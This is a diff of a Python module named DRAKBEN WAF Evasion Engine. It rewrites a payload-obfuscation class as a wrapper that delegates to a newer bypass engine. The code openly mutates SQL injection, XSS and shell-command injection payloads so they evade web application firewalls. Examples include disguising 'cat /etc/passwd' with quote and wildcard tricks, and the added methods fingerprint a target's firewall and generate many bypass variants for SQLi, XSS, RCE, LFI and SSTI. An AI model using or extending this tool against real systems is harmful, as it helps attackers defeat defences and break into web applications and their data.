@@ -1,22 +1,46 @@
-"""DRAKBEN WAF EVASION ENGINE
-Description: Advanced payload obfuscation and WAF bypass techniques.
+"""DRAKBEN WAF EVASION ENGINE (Legacy Wrapper)
+Description: Backward-compatible wrapper for the new WAFBypassEngine.
 Author: @ahmetdrak
-Techniques:
-- SQLi: Comment pollution, Whitespace randomization, Hex encoding, Unicode smuggling.
-- XSS: Tag nesting, Event handler mutation, JavaScript encoding.
-- RCE: String concatenation, Wildcard expansion, Tauthon evasion.
+
+This module maintains backward compatibility with existing code while
+delegating to the new, more powerful WAFBypassEngine.
+
+For new code, use WAFBypassEngine directly:
+    from modules.waf_bypass_engine import WAFBypassEngine
 """
+
+from __future__ import annotations
 
 import binascii
 import secrets
 
+# Import new engine
+try:
+    from modules.waf_bypass_engine import PayloadType, WAFBypassEngine
+    _HAS_NEW_ENGINE = True
+except ImportError:
+    _HAS_NEW_ENGINE = False
+    PayloadType = None  # type: ignore
+    WAFBypassEngine = None  # type: ignore
+
 
 class WAFEvasion:
-    """Polymorphic WAF Evasion Engine.
-    Mutates attack payloads to bypass LibInjection and Regex-based filters.
+    """Polymorphic WAF Evasion Engine (Legacy API).
+
+    This class provides backward compatibility with the old API while
+    using the new WAFBypassEngine under the hood for better results.
+
+    For new code, prefer using WAFBypassEngine directly.
     """
 
     def __init__(self) -> None:
+        # Initialize new engine if available
+        if _HAS_NEW_ENGINE:
+            self._engine = WAFBypassEngine()
+        else:
+            self._engine = None
+
+        # Legacy keyword mappings (kept for fallback)
         self.sql_keywords = {
             "UNION": [
                 "/*!UNION*/",
@@ -75,8 +99,25 @@ class WAFEvasion:
 
     def obfuscate_sql(self, payload: str, aggressiveness: int = 2) -> str:
         """Obfuscate SQL Injection payload.
+
+        Uses new WAFBypassEngine if available, falls back to legacy.
         Aggressiveness: 1 (Basic) -> 3 (Extreme/Experimental).
         """
+        # Try new engine first
+        if self._engine is not None and PayloadType is not None:
+            try:
+                result = self._engine.generate_bypass(
+                    payload=payload,
+                    payload_type=PayloadType.SQLI,
+                    techniques=["all"],
+                    count=1
+                )
+                if result.variants:
+                    return result.variants[0]
+            except Exception:
+                pass  # Fall back to legacy
+
+        # Legacy implementation
         obfuscated = payload
 
         if aggressiveness >= 1:
@@ -91,7 +132,25 @@ class WAFEvasion:
         return obfuscated
 
     def obfuscate_xss(self, payload: str) -> str:
-        """Obfuscate XSS payload using tag/attribute mutation."""
+        """Obfuscate XSS payload using tag/attribute mutation.
+
+        Uses new WAFBypassEngine if available.
+        """
+        # Try new engine first
+        if self._engine is not None and PayloadType is not None:
+            try:
+                result = self._engine.generate_bypass(
+                    payload=payload,
+                    payload_type=PayloadType.XSS,
+                    techniques=["all"],
+                    count=1
+                )
+                if result.variants:
+                    return result.variants[0]
+            except Exception:
+                pass  # Fall back to legacy
+
+        # Legacy implementation
         # 1. Case Randomization: <script> -> <ScRiPt>
         chars = list(payload)
         for i in range(len(chars)):
@@ -102,7 +161,7 @@ class WAFEvasion:
 
         # 2. Protocol Wrappers: javascript: -> java	script: (Tab)
         if "javascript:" in mutated.lower():
-            mutated = mutated.replace(":", "	:")
+            mutated = mutated.replace(":", "\t:")
 
         # 3. Double Check: SVG payload if script is blocked
         if "<script" in payload.lower():
@@ -119,8 +178,25 @@ class WAFEvasion:
 
     def obfuscate_shell(self, payload: str) -> str:
         """Obfuscate OS Command Injection (Bash/Linux).
+
+        Uses new WAFBypassEngine if available.
         cat /etc/passwd -> c''a''t /e??/p?s??d.
         """
+        # Try new engine first
+        if self._engine is not None and PayloadType is not None:
+            try:
+                result = self._engine.generate_bypass(
+                    payload=payload,
+                    payload_type=PayloadType.RCE,
+                    techniques=["all"],
+                    count=1
+                )
+                if result.variants:
+                    return result.variants[0]
+            except Exception:
+                pass  # Fall back to legacy
+
+        # Legacy implementation
         # 1. String Concatenation: cat -> c'a't
         if secrets.choice([True, False]):  # 50% chance
             new_payload = ""
@@ -149,7 +225,83 @@ class WAFEvasion:
         return payload
 
 
+    # === NEW API METHODS (delegate to engine) ===
+
+    def get_engine(self) -> WAFBypassEngine | None:
+        """Get the underlying WAFBypassEngine instance.
+
+        Returns None if new engine is not available.
+        """
+        return self._engine
+
+    def fingerprint_waf(self, target: str) -> dict | None:
+        """Fingerprint WAF on target (requires new engine)."""
+        if self._engine:
+            return self._engine.fingerprint(target)
+        return None
+
+    def generate_advanced_bypass(
+        self,
+        payload: str,
+        payload_type: str = "sqli",
+        count: int = 10
+    ) -> list[str]:
+        """Generate multiple bypass variants using new engine.
+
+        Args:
+            payload: Original payload
+            payload_type: "sqli", "xss", "rce", "lfi", "ssti"
+            count: Number of variants to generate
+
+        Returns:
+            List of bypass variants
+        """
+        if self._engine is None or PayloadType is None:
+            # Fall back to legacy single variant
+            if payload_type == "sqli":
+                return [self.obfuscate_sql(payload)]
+            elif payload_type == "xss":
+                return [self.obfuscate_xss(payload)]
+            elif payload_type == "rce":
+                return [self.obfuscate_shell(payload)]
+            return [payload]
+
+        # Map string type to enum
+        type_map = {
+            "sqli": PayloadType.SQLI,
+            "xss": PayloadType.XSS,
+            "rce": PayloadType.RCE,
+            "lfi": PayloadType.LFI,
+            "ssti": PayloadType.SSTI,
+        }
+        ptype = type_map.get(payload_type.lower(), PayloadType.SQLI)
+
+        result = self._engine.generate_bypass(
+            payload=payload,
+            payload_type=ptype,
+            techniques=["all"],
+            count=count
+        )
+        return result.variants if result.variants else [payload]
+
+
+# Convenience function for quick access
+def create_waf_bypass_engine() -> WAFBypassEngine | None:
+    """Create a new WAFBypassEngine instance.
+
+    Returns None if new engine is not available.
+    """
+    if _HAS_NEW_ENGINE:
+        return WAFBypassEngine()
+    return None
+
+
 # Usage Example:
 # waf = WAFEvasion()
 # print(waf.obfuscate_sql("UNION SELECT 1,2"))
-# -> /*!50000UNION*/ /**/ /*!50000SELECT*/ /**/ 1,2
+# -> Uses new engine if available, otherwise legacy
+#
+# # Or use new engine directly:
+# from modules.waf_bypass_engine import WAFBypassEngine, PayloadType
+# engine = WAFBypassEngine()
+# result = engine.generate_bypass("' OR 1=1--", PayloadType.SQLI)
